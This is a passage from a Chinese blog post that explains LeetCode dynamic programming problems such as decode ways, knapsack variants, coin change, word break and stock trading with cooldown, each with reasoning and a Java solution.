class="markdownIt-Anchor" href="#思路-46"></a> 思路</h4><p>  本题与跳台阶本质上相同，如果我们用<code>dp[i]</code>代表当前位可以解码的方式，那么对于第i位有两种选择。</p><ol><li>第i位单独解码，此时<code>dp[i]=dp[i-1]</code></li><li>第i位与第i-1位共同解码，此时<code>dp[i]=dp[i-2]</code></li></ol><p>  综上，所以<code>dp[i]=dp[i-1]+dp[i-2]</code>。<br />  但是要注意，0不能单独解码，所以如果s[i-1]是0，那么dp[i-1]也是0。<br />  如果s[i-2]是0，则不能加上前一位进行解码，即dp[i-2]是0。<br />  同时由于解码数字不会超过26，所以如果最近两位解码结果超过26，那么dp[i-2]也是0。</p><h4 id="代码-44"><a class="markdownIt-Anchor" href="#代码-44"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.length()==<span class="number">0</span>||(s.length()==<span class="number">1</span>&amp;&amp;s.charAt(<span class="number">0</span>)==<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(s.length()==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[s.length()+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>]=s.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> onestep=s.charAt(i-<span class="number">1</span>)==<span class="string">&#x27;0&#x27;</span>?<span class="number">0</span>:dp[i-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> twostep=Integer.valueOf(s.substring(i - <span class="number">2</span>, i));</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i-<span class="number">2</span>)==<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                twostep=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                twostep=twostep&gt;<span class="number">26</span>?<span class="number">0</span>:dp[i-<span class="number">2</span>];</span><br><span class="line">            dp[i]=onestep+twostep;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-最长递增子序列"><a class="markdownIt-Anchor" href="#11-最长递增子序列"></a> 11. 最长递增子序列</h3><p>  <a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/">https://leetcode-cn.com/problems/longest-increasing-subsequence/</a></p><h4 id="思路-47"><a class="markdownIt-Anchor" href="#思路-47"></a> 思路</h4><p>  如果我们用<code>dp[i]</code>代表以第i个数字结尾的最长递增序列的长度，则我们从<code>0~i</code>遍历j，对于每一个比<code>nums[i]</code>小的<code>nums[j]</code>,都要比较<code>dp[i]=Max(dp[i],dp[j]+1)</code>。此处注意<code>dp[i]</code>的默认值是1，最后取dp数组最大值即可。</p><h4 id="代码-45"><a class="markdownIt-Anchor" href="#代码-45"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="keyword">null</span>||nums.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j])</span><br><span class="line">                    dp[i]=Math.max(dp[i],dp[j]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(max&lt;dp[i])</span><br><span class="line">                max=dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-一组整数对能够构成的最长链"><a class="markdownIt-Anchor" href="#12-一组整数对能够构成的最长链"></a> 12. 一组整数对能够构成的最长链</h3><p>  <a href="https://leetcode-cn.com/problems/maximum-length-of-pair-chain/">https://leetcode-cn.com/problems/maximum-length-of-pair-chain/</a></p><h4 id="思路-48"><a class="markdownIt-Anchor" href="#思路-48"></a> 思路</h4><p>  与上一题基本一样，本题只是需要先将数对按起点排序，然后遍历找到可以与当前数对形成数链的数对，比较dp。</p><h4 id="代码-46"><a class="markdownIt-Anchor" href="#代码-46"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLongestChain</span><span class="params">(<span class="keyword">int</span>[][] pairs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pairs==<span class="keyword">null</span>||pairs.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Arrays.sort(pairs,(a,b)-&gt;(a[<span class="number">0</span>]-b[<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[pairs.length];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;pairs.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pairs[j][<span class="number">1</span>]&lt;pairs[i][<span class="number">0</span>])</span><br><span class="line">                    dp[i]=Math.max(dp[i],dp[j]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(max&lt;dp[i])</span><br><span class="line">                max=dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-最长摆动子序列"><a class="markdownIt-Anchor" href="#13-最长摆动子序列"></a> 13. 最长摆动子序列</h3><p>  <a href="https://leetcode-cn.com/problems/wiggle-subsequence/">https://leetcode-cn.com/problems/wiggle-subsequence/</a></p><h4 id="思路-49"><a class="markdownIt-Anchor" href="#思路-49"></a> 思路</h4><p>  用两个变量up和down分别计算向上摆动和向下摆动的数量，从头遍历数组，如果数组向上了，那么当前的up就是上一位的down+1，如果数组向下了，那么当前的down就是上一位的up+1。</p><h4 id="代码-47"><a class="markdownIt-Anchor" href="#代码-47"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">wiggleMaxLength</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">1</span>, down = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                up = down + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] &lt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                down = up + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(up, down);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-划分数组为和相等的两部分"><a class="markdownIt-Anchor" href="#14-划分数组为和相等的两部分"></a> 14. 划分数组为和相等的两部分</h3><p>  <a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/">https://leetcode-cn.com/problems/partition-equal-subset-sum/</a></p><h4 id="思路-50"><a class="markdownIt-Anchor" href="#思路-50"></a> 思路</h4><p>  对于背包问题，我们可以用<code>dp[i][j]</code>来表示从<code>0~i</code>中是否存在满足价值为j的组合。<br />  而是否满足主要有两种选择：</p><ol><li>如果不选择当前<code>nums[i]</code>的价值，则依赖于<code>dp[i-1][j]</code>，两者判断状态相同。</li><li>如果选择当前<code>nums[i]</code>的价值，则依赖于<code>dp[i-1][j-nums[i]]</code>,两者判断状态相同。</li></ol><p>  如果有一种情况满足需求，则<code>dp[i][j]</code>可以实现。</p><h4 id="代码-48"><a class="markdownIt-Anchor" href="#代码-48"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canPartition</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">            sum+=nums[i];</span><br><span class="line">        <span class="keyword">if</span>(sum%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        sum/=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">boolean</span>[] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[sum+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=sum;j&gt;=nums[i];j--)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[j]=dp[j]||dp[j-nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[sum];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-改变一组数的正负号使得它们的和为一给定数"><a class="markdownIt-Anchor" href="#15-改变一组数的正负号使得它们的和为一给定数"></a> 15. 改变一组数的正负号使得它们的和为一给定数</h3><p>  <a href="https://leetcode-cn.com/problems/target-sum/">https://leetcode-cn.com/problems/target-sum/</a></p><h4 id="思路-51"><a class="markdownIt-Anchor" href="#思路-51"></a> 思路</h4><p>  引用CYC推理</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将数组看成两部分，P 和 N，其中 P 使用正号，N 使用负号，有以下推导：</span><br><span class="line">                  sum(P) - sum(N) &#x3D; target</span><br><span class="line">sum(P) + sum(N) + sum(P) - sum(N) &#x3D; target + sum(P) + sum(N)</span><br><span class="line">                       2 * sum(P) &#x3D; target + sum(nums)</span><br><span class="line">&amp;emsp;&amp;emsp;因此只要找到一个子集，令它们都取正号，并且和等于 (target + sum(nums))&#x2F;2，就证明存在解。</span><br></pre></td></tr></table></figure><h4 id="代码-49"><a class="markdownIt-Anchor" href="#代码-49"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findTargetSumWays</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">            sum+=nums[i];</span><br><span class="line">        <span class="keyword">if</span> (sum &lt; S || (sum + S) % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> W = (sum + S) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[W + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = W; i &gt;= num; i--) &#123;</span><br><span class="line">                dp[i] = dp[i] + dp[i - num];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[W];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-01-字符构成最多的字符串"><a class="markdownIt-Anchor" href="#16-01-字符构成最多的字符串"></a> 16. 01 字符构成最多的字符串</h3><p>  <a href="https://leetcode-cn.com/problemset/all/?search=474">https://leetcode-cn.com/problemset/all/?search=474</a></p><h4 id="思路-52"><a class="markdownIt-Anchor" href="#思路-52"></a> 思路</h4><p>  多维费用问题，我们用<code>dp[i][j]</code>表示使用i个0和j个1能表示的字符串的最大数量。<br />  则<code>dp[i][j]=Max(dp[i][j],dp[i-zero][j-one]+1)</code>,其中zero代表当前0的数量，1代表当前1的数量。</p><h4 id="代码-50"><a class="markdownIt-Anchor" href="#代码-50"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxForm</span><span class="params">(String[] strs, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strs.length == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span>[][] dp =<span class="keyword">new</span> <span class="keyword">int</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(String s :strs) &#123;</span><br><span class="line"><span class="keyword">int</span> zeros  = <span class="number">0</span>,ones = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">char</span> c:s.toCharArray()) &#123;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">zeros++;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">ones++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = m; i &gt;=zeros; i--) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = n; j &gt;= ones; j--) &#123;</span><br><span class="line">dp[i][j] = Math.max(dp[i][j], <span class="number">1</span>+dp[i-zeros][j-ones]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-找零钱的最少硬币数"><a class="markdownIt-Anchor" href="#17-找零钱的最少硬币数"></a> 17. 找零钱的最少硬币数</h3><p>  <a href="https://leetcode-cn.com/problems/coin-change/">https://leetcode-cn.com/problems/coin-change/</a></p><h4 id="思路-53"><a class="markdownIt-Anchor" href="#思路-53"></a> 思路</h4><p>  背包大小就是所给的amout，占据背包容量的就是硬币面额。<br />  <code>完全背包只需要将 0-1 背包的逆序遍历 dp 数组改为正序遍历即可。</code><br />  然后取最小数量，对于每个<code>dp[i][j]</code>,最小数量有三种情况：</p><ol><li>当前硬币就是容量大小，即<code>coins[i]==j</code>，那么使用这枚硬币即可完成任务，必然获得最小值1。</li><li>不使用当前硬币时，无法满足要求(即<code>dp[i-1][j]==0</code>)，但是使用当前硬币可以满足要求(即<code>dp[i][j-coins[i]]!=0</code>)，dp[i][j]为<code>dp[i][j-coins[i]]+1</code>。</li><li>使用当前硬币可以完成要求，不使用也可以完成要求，则要两者比较取最小值。</li></ol><h4 id="代码-51"><a class="markdownIt-Anchor" href="#代码-51"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="keyword">int</span>[] coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount == <span class="number">0</span> || coins == <span class="keyword">null</span> || coins.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;coins.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=coins[i];j&lt;=amount;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j==coins[i])</span><br><span class="line">                    dp[j]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">if</span>(dp[j]==<span class="number">0</span>&amp;&amp;dp[j-coins[i]]!=<span class="number">0</span>)</span><br><span class="line">                        dp[j]=dp[j-coins[i]]+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">if</span>(dp[j-coins[i]]!=<span class="number">0</span>)</span><br><span class="line">                        dp[j]=Math.min(dp[j],dp[j-coins[i]]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount] == <span class="number">0</span> ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="18-找零钱的硬币数组合"><a class="markdownIt-Anchor" href="#18-找零钱的硬币数组合"></a> 18. 找零钱的硬币数组合</h3><p>  <a href="https://leetcode-cn.com/problems/coin-change-2/submissions/">https://leetcode-cn.com/problems/coin-change-2/submissions/</a></p><h4 id="思路-54"><a class="markdownIt-Anchor" href="#思路-54"></a> 思路</h4><p>  与上题类似，只不过本题需要求可能获得的组合总数，对于每一个<code>dp[i][j]</code>，其状态转移方程为<code>dp[i][j]=dp[i-1][j]+dp[i][j-coins[i]]</code>。</p><h4 id="代码-52"><a class="markdownIt-Anchor" href="#代码-52"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, <span class="keyword">int</span>[] coins)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[amount+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;coins.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> coin=coins[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=coin;j&lt;=amount;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[j]+=dp[j-coin];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="19-字符串按单词列表分割"><a class="markdownIt-Anchor" href="#19-字符串按单词列表分割"></a> 19. 字符串按单词列表分割</h3><p>  <a href="https://leetcode-cn.com/problems/word-break/">https://leetcode-cn.com/problems/word-break/</a></p><h4 id="思路-55"><a class="markdownIt-Anchor" href="#思路-55"></a> 思路</h4><p>  字典单词是可以重复使用的，故本题为一个完全背包问题，用字典单词来填充背包，所要对比的价值就是字符串。<br />  对于有序的背包问题，将物品的迭代放在最里层，背包的迭代放在外层。</p><h4 id="代码-53"><a class="markdownIt-Anchor" href="#代码-53"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">boolean</span>[] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String word : wordDict) &#123;   <span class="comment">// 对物品的迭代应该放在最里层</span></span><br><span class="line">                <span class="keyword">int</span> len = word.length();</span><br><span class="line">                <span class="keyword">if</span> (len &lt;= i &amp;&amp; word.equals(s.substring(i - len, i))) &#123;</span><br><span class="line">                    dp[i] = dp[i] || dp[i - len];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="20-组合总和"><a class="markdownIt-Anchor" href="#20-组合总和"></a> 20. 组合总和</h3><p>  <a href="https://leetcode-cn.com/problems/combination-sum-iv/">https://leetcode-cn.com/problems/combination-sum-iv/</a></p><h4 id="思路-56"><a class="markdownIt-Anchor" href="#思路-56"></a> 思路</h4><p>  依然是有序的完全背包问题。</p><h4 id="代码-54"><a class="markdownIt-Anchor" href="#代码-54"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">combinationSum4</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">int</span> n=nums.length;</span><br><span class="line">        <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[target+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=target;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums.length&amp;&amp;i&gt;=nums[j];j++)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]+=dp[i-nums[j]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="背包问题总结"><a class="markdownIt-Anchor" href="#背包问题总结"></a> 背包问题总结</h4><p>  对于背包问题，主要有两种，即<code>0-1背包</code>or<code>完全背包</code>，这其中又可分为<code>元素有序</code>与<code>元素无序</code>两种。<br />  对于无序问题，则对于元素的遍历在外层，对于背包的遍历在内层。我们以<code>V[]</code>来代表元素数组，<code>target</code>来代表目标价值，则两层循环可以表示为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=target;j&gt;=V[i];j--)</span><br></pre></td></tr></table></figure><p>  对于完全背包，则需要将内层循环的顺序反序</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=V[i];j&lt;=target;j++)</span><br></pre></td></tr></table></figure><p>  而对于有序问题，需要将两层循环换位，可知循环条件需为<code>V[i]&lt;=j&lt;=target</code>,所以完全背包的双层循环可以表示为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=target;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;V.length&amp;&amp;j&gt;=V[i];j++)</span><br></pre></td></tr></table></figure><h3 id="21-需要冷却期的股票交易"><a class="markdownIt-Anchor" href="#21-需要冷却期的股票交易"></a> 21. 需要冷却期的股票交易</h3><p>  <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/</a></p><h4 id="思路-57"><a class="markdownIt-Anchor" href="#思路-57"></a> 思路</h4><p>  sell[i]表示截至第i天，最后一个操作是卖时的最大收益；<br />  buy[i]表示截至第i天，最后一个操作是买时的最大收益；<br />  cool[i]表示截至第i天，最后一个操作是冷冻期时的最大收益；<br />  递推公式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sell[i] &#x3D; max(buy[i-1]+prices[i], sell[i-1]) (第一项表示第i天卖出，第二项表示第i天冷冻)  </span><br><span class="line">buy[i] &#x3D; max(cool[i-1]-prices[i], buy[i-1])  (第一项表示第i天买进，第二项表示第i天冷冻)  </span><br><span class="line">cool[i] &#x3D; max(sell[i-1], cool[i-1])          (第一项表示第i天卖出，从而变为冷冻期，第二项表示第i天冷冻)  </span><br></pre></td></tr></table></figure><p>  此外还要注意数组长度只有1个的时候是不买的，利润为0。其他情况buy[0]一定是prices[0]的相反数。</p><h4 id="代码-55"><a class="markdownIt-Anchor" href="#代码-55"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] sell=<span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">        <span class="keyword">int</span>[] buy=<span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">        <span class="keyword">int</span>[] cool=<span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">        <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        buy[<span class="number">0</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sell[i]=Math.max(buy[i-<span class="number">1</span>]+prices[i],sell[i-<span class="number">1</span>]);</span><br><span class="line">            buy[i]=Math.max(cool[i-<span class="number">1</span>]-prices[i],buy[i-<span class="number">1</span>]);</span><br><span class="line">            cool[i]=Math.max(sell[i-<span class="number">1</span>], cool[i-<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[prices.length-<span 